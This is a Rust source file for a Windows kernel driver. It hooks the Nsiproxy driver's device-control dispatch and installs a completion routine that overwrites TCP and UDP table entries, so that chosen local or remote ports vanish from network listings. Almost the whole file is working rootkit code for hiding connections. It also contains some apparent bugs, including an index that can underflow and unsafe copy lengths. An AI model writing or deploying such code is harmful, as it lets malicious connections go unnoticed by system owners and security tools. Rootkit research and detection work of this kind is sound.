use {
    shared::{
        enums::{PortType, Protocol}, 
        structs::PortInfo
    },
    wdk_sys::{
        *, 
        _MODE::KernelMode,
        ntddk::{ExFreePool, ObfDereferenceObject, ProbeForRead}, 
    },
    core::{
        ptr::{null_mut, copy},
        sync::atomic::{AtomicPtr, Ordering, AtomicBool},
        ffi::c_void, mem::size_of, slice::from_raw_parts_mut,
    },
    crate::{
        internals::{
            enums::COMUNICATION_TYPE,
            externs::{ObReferenceObjectByName, IoDriverObjectType},
            structs::{
                NSI_UDP_ENTRY, NSI_PARAM, NSI_TABLE_TCP_ENTRY,
                NSI_STATUS_ENTRY, NSI_PROCESS_ENTRY
            }
        }, 
        utils::{
            pool::PoolMemory, uni::str_to_unicode,
            valid_kernel_memory, valid_user_memory,
        }
    },
};

pub mod port;
pub mod ioctls;

/// Holds the original NSI dispatch function, used to store the original pointer before hooking.
static mut ORIGINAL_NSI_DISPATCH: AtomicPtr<()> = AtomicPtr::new(null_mut());

/// Indicates whether the callback has been activated.
pub static HOOK_INSTALLED: AtomicBool = AtomicBool::new(false);

/// Represents a Port structure used for hooking into the NSI proxy driver and intercepting network information.
pub struct Port;

impl Port {
    /// Control code for the NSI communication.
    const NIS_CONTROL_CODE: u32 = 1179675;

    /// Network driver name.
    const NSI_PROXY: &str = "\\Driver\\Nsiproxy";

    /// Installs a hook into the NSI proxy driver, replacing the original dispatch function.
    ///
    /// This function hooks into the NSI proxy driver by replacing the `IRP_MJ_DEVICE_CONTROL`
    /// dispatch function with `hook_nsi`. It stores the original dispatch function in a static
    /// atomic pointer so that it can be called later.
    ///
    /// # Returns
    /// 
    /// - `Ok(())`: If the hook was installed successfully.
    /// - `Err(NTSTATUS)`: If the function fails to reference the NSI proxy driver object or
    /// if no original function is found in the `IRP_MJ_DEVICE_CONTROL` dispatch table.
    /// 
    pub unsafe fn install_hook() -> Result<(), NTSTATUS> {
        let mut driver_object: *mut DRIVER_OBJECT = null_mut();
        let status = ObReferenceObjectByName(
            &mut str_to_unicode(Self::NSI_PROXY).to_unicode(), 
            OBJ_CASE_INSENSITIVE, 
            null_mut(), 
            0, 
            *IoDriverObjectType, 
            KernelMode as i8, 
            null_mut(), 
            &mut driver_object as *mut _ as *mut *mut core::ffi::c_void 
        );
        if !NT_SUCCESS(status) {
            log::error!("ObReferenceObjectByName Failed With Status: {:?}", status);
            return Err(status)
        }

        let major_function = &mut (*driver_object).MajorFunction[IRP_MJ_DEVICE_CONTROL as usize];
        if let Some(original_function) = major_function.take() {
            let original_function_ptr = original_function as *mut ();
            ORIGINAL_NSI_DISPATCH.store(original_function_ptr, Ordering::SeqCst);
    
            *major_function = Some(Self::hook_nsi);
            HOOK_INSTALLED.store(true, Ordering::SeqCst);
        } else {
            log::error!("No original function found in MajorFunction[IRP_MJ_DEVICE_CONTROL]");
            ObfDereferenceObject(driver_object as _);
            return Err(STATUS_UNSUCCESSFUL);
        }

        ObfDereferenceObject(driver_object as _);

        Ok(())
    }

    /// Uninstalls the NSI hook previously installed in the driver.
    ///
    /// This function safely uninstalls the hook from the NSI proxy driver, which was originally
    /// installed to intercept and modify network table entries. The function ensures that the
    /// original dispatch function is restored and any remaining hooks or operations are cleaned
    /// up before the driver is unloaded.
    ///
    /// # Returns
    /// 
    /// - `STATUS_SUCCESS`: If the hook was successfully uninstalled.
    /// - `STATUS_UNSUCCESSFUL`: If the hook was not installed or the uninstall operation failed.
    ///
    pub unsafe fn uninstall_hook() -> NTSTATUS {
        let mut driver_object: *mut DRIVER_OBJECT = null_mut();
        let status = ObReferenceObjectByName(
            &mut str_to_unicode(Self::NSI_PROXY).to_unicode(),
            OBJ_CASE_INSENSITIVE,
            null_mut(),
            0,
            *IoDriverObjectType,
            KernelMode as i8,
            null_mut(),
            &mut driver_object as *mut _ as *mut *mut core::ffi::c_void,
        );
        if !NT_SUCCESS(status) {
            log::error!("ObReferenceObjectByName Failed With Status: {:?}", status);
            return status;
        }
    
        if HOOK_INSTALLED.load(Ordering::SeqCst) {
            let major_function = &mut (*driver_object).MajorFunction[IRP_MJ_DEVICE_CONTROL as usize];

            let original_function_ptr = ORIGINAL_NSI_DISPATCH.load(Ordering::SeqCst);
            if !original_function_ptr.is_null() {
                let original_function: PDRIVER_DISPATCH = core::mem::transmute(original_function_ptr);
                *major_function = original_function;
    
                HOOK_INSTALLED.store(false, Ordering::SeqCst);
            } else {
                log::error!("Original NSI Dispatch function not found in ORIGINAL_NSI_DISPATCH");
                ObfDereferenceObject(driver_object as _);
                return STATUS_UNSUCCESSFUL;
            }
        } else {
            log::warn!("Hook is not installed, cannot uninstall.");
            ObfDereferenceObject(driver_object as _);
            return STATUS_UNSUCCESSFUL;
        }
    
        ObfDereferenceObject(driver_object as _);
        
        STATUS_SUCCESS
    }

    /// Hooked dispatch function that intercepts NSI proxy requests and modifies network table entries.
    ///
    /// This function is called when an IRP (I/O Request Packet) is sent to the NSI proxy driver
    /// and the control code matches `NIS_CONTROL_CODE`. It intercepts TCP and UDP entries, 
    /// allowing modification of network data, such as filtering specific ports.
    ///
    /// # Arguments
    /// 
    /// - `device_object`: A pointer to the device object.
    /// - `irp`: A pointer to the IRP (I/O Request Packet).
    ///
    /// # Returns
    /// 
    /// - `NTSTATUS`: The result of the original dispatch function or `STATUS_UNSUCCESSFUL` if the hook fails.
    /// 
    unsafe extern "C" fn hook_nsi(device_object: *mut DEVICE_OBJECT, irp: *mut IRP) -> NTSTATUS {
        let stack = (*irp).Tail.Overlay.__bindgen_anon_2.__bindgen_anon_1.CurrentStackLocation;
        let control_code = (*stack).Parameters.DeviceIoControl.IoControlCode;

        if control_code == Self::NIS_CONTROL_CODE {
            let context = PoolMemory::new(POOL_FLAG_NON_PAGED, size_of::<(PIO_COMPLETION_ROUTINE, *mut c_void)>() as u64, 0x444E4954);
            match context {
                Some(addr) => {
                    let address = addr.ptr as *mut (PIO_COMPLETION_ROUTINE, *mut c_void);
                    (*address).0 = (*stack).CompletionRoutine;
                    (*address).1 = (*stack).Context;

                    (*stack).Context = address as *mut c_void;
                    (*stack).CompletionRoutine = Some(Self::irp_complete);
                    (*stack).Control |= SL_INVOKE_ON_SUCCESS as u8;

                    // Disabling Drop
                    core::mem::forget(addr);
                },
                None => {}
            }
        }

        let original_function_ptr = ORIGINAL_NSI_DISPATCH.load(Ordering::SeqCst);
        let original_function: PDRIVER_DISPATCH = core::mem::transmute(original_function_ptr);

        return original_function.map_or(STATUS_UNSUCCESSFUL, |func| func(device_object, irp));
    }
    
    /// Completion routine for IRP that modifies network entries in the NSI tables.
    ///
    /// This function is called after the original completion routine is invoked. It inspects the network
    /// table entries (TCP or UDP) and can remove or modify entries based on certain conditions (e.g., port filtering).
    ///
    /// # Arguments
    /// 
    /// - `device_object`: A pointer to the device object.
    /// - `irp`: A pointer to the IRP (I/O Request Packet).
    /// - `context`: A pointer to the context passed from the `hook_nsi` function.
    ///
    /// # Returns
    /// 
    /// - `NTSTATUS`: The result of the original completion routine or `STATUS_SUCCESS` if successful.
    /// 
    unsafe extern "C" fn irp_complete(device_object: *mut DEVICE_OBJECT, irp: *mut IRP, context: *mut c_void) -> NTSTATUS {
        let context_addr = context as *mut (PIO_COMPLETION_ROUTINE, *mut c_void);

        if NT_SUCCESS((*irp).IoStatus.__bindgen_anon_1.Status) {
            let nsi_param = (*irp).UserBuffer as *mut NSI_PARAM;
            let mut status_success = true;

            if !valid_user_memory(nsi_param as u64) && !NetworkUtils::validate_context(nsi_param as _) {
                status_success = false;
            } else if valid_kernel_memory(nsi_param as u64) || nsi_param.is_null() {
                status_success = false;
            }

            if status_success && !(*nsi_param).entries.is_null() && (*nsi_param).entry_size != 0 {
                let tcp_entries = (*nsi_param).entries as *mut NSI_TABLE_TCP_ENTRY;
                let udp_entries = (*nsi_param).entries as *mut NSI_UDP_ENTRY;
                let entries = (*nsi_param).entries;

                for i in 0..(*nsi_param).count {
                    match (*nsi_param).type_ {
                        COMUNICATION_TYPE::TCP => {
                            if valid_user_memory((*tcp_entries.add(i)).local.port as u64) || valid_user_memory((*tcp_entries.add(i)).remote.port as u64) {
                                let local_port = u16::from_be((*tcp_entries.add(i)).local.port);
                                let remote_port = u16::from_be((*tcp_entries.add(i)).remote.port);
                                NetworkUtils::process_entry_copy(
                                    tcp_entries,
                                    (*nsi_param).count as usize,
                                    i,
                                    local_port,
                                    Some(remote_port),
                                    Protocol::TCP,
                                    (*nsi_param).status_entries,
                                    (*nsi_param).process_entries,
                                    nsi_param,
                                );
                            }
                        },
                        COMUNICATION_TYPE::UDP => {
                            if valid_user_memory((*udp_entries.add(i)).port as u64) {
                                let local_port = u16::from_be((*udp_entries.add(i)).port);
                                NetworkUtils::process_entry_copy(
                                    udp_entries,
                                    (*nsi_param).count as usize,
                                    i,
                                    local_port,
                                    None,
                                    Protocol::UDP,
                                    (*nsi_param).status_entries,
                                    (*nsi_param).process_entries,
                                    nsi_param,
                                );
                            }
                        }
                    }
                }
            }
        }

        if let Some(original_routine) = (*context_addr).0 {
            let mut original_context = null_mut();

            if !(*context_addr).1.is_null() {
                original_context = (*context_addr).1;
            }
    
            ExFreePool(context as *mut _);
            return original_routine(device_object, irp, original_context);
        }

        ExFreePool(context as *mut _);
        STATUS_SUCCESS
    }

}

/// Utility struct for network-related operations, such as validating memory and handling NSI table entries.
pub struct NetworkUtils;

impl NetworkUtils {
    /// Validates a memory address to ensure it can be safely accessed from kernel mode.
    ///
    /// This function uses `ProbeForRead` to check whether a memory address is valid and accessible.
    /// It wraps the operation in a Structured Exception Handling (SEH) block to catch and log any exceptions.
    ///
    /// # Arguments
    /// 
    /// - `address`: The memory address to validate.
    ///
    /// # Returns
    /// 
    /// - `true`: If the address is valid and accessible.
    /// - `false`: If an exception occurs while probing the address.
    /// 
    unsafe fn validate_context(address: *mut c_void) -> bool {
        let result = microseh::try_seh(|| {
            ProbeForRead(address, size_of::<NSI_PARAM>() as u64, size_of::<NSI_PARAM>() as u32);
        });
    
        match result {
            Ok(_) => true,
            Err(err) => {
                log::error!("Exception when trying to read the address: {:?}", err.code());
                false
            }
        }
    }

    /// Copies network table entries (TCP/UDP) from one index to another and updates associated status
    /// and process entries if necessary.
    ///
    /// This function is used to modify NSI (Network Store Interface) table entries during a network 
    /// hook operation. It copies TCP/UDP entries, status entries, and process entries, effectively 
    /// "hiding" specific network ports.
    ///
    /// # Arguments
    /// 
    /// - `entries`: A pointer to the list of TCP or UDP entries.
    /// - `count`: The total number of entries in the table.
    /// - `i`: The index of the current entry being processed.
    /// - `port`: The port number associated with the current entry.
    /// - `status_entries`: A pointer to the list of status entries associated with the network connections.
    /// - `process_entries`: A pointer to the list of process entries associated with the network connections.
    /// - `nsi_param`: A pointer to the `NSI_PARAM` structure, containing information about the network table.
    ///
    unsafe fn process_entry_copy<T: Sized>(
        entries: *mut T,
        count: usize,
        i: usize,
        local_port: u16,
        remote_port: Option<u16>,
        protocol: Protocol,
        status_entries: *mut NSI_STATUS_ENTRY,
        process_entries: *mut NSI_PROCESS_ENTRY,
        nsi_param: *mut NSI_PARAM
    ) {
        let port_number = match (local_port, remote_port) {
            // If the local port is zero and the remote port is Some(value)
            (0, Some(remote)) if remote != 0 => remote,
            // If the remote port is not defined or is also zero, use the local one
            (local, _) if local != 0 => local,
            // If both are zero, this can be treated as an invalid condition
            _ => {
                log::warn!("Both doors are zero, there is no way to process the entrance.");
                return;
            }
        };    
        
        let port_type = if remote_port.unwrap_or(0) != 0 {
            PortType::REMOTE
        } else {
            PortType::LOCAL
        };

        let info = PortInfo {
            protocol,
            port_type,
            port_number,
            enable: true,
        };

        if port::check_port(info) {
            let mut entries_index = i + 1;
            if entries_index >= count {
                entries_index = i - 1;
            }
    
            // Copies TCP/UDP entries.
            let entries_slice = from_raw_parts_mut(entries, count);
            copy(
                &entries_slice[entries_index],
                &mut entries_slice[i],
                count - entries_index,
            );
        
            // Verify and copy status_entries.
            if !status_entries.is_null() {
                let status_entries_slice = from_raw_parts_mut(status_entries, count);
                if entries_index < status_entries_slice.len() {
                    copy(
                        &status_entries_slice[entries_index],
                        &mut status_entries_slice[i],
                        count - entries_index,
                    );
                }
            }
        
            // Check and copy process_entries.
            if !process_entries.is_null() {
                let process_entries_slice = from_raw_parts_mut(process_entries, count);
                if entries_index < process_entries_slice.len() {
                    copy(
                        &process_entries_slice[entries_index],
                        &mut process_entries_slice[i],
                        count - entries_index,
                    );
                }
            }
        }
    }
}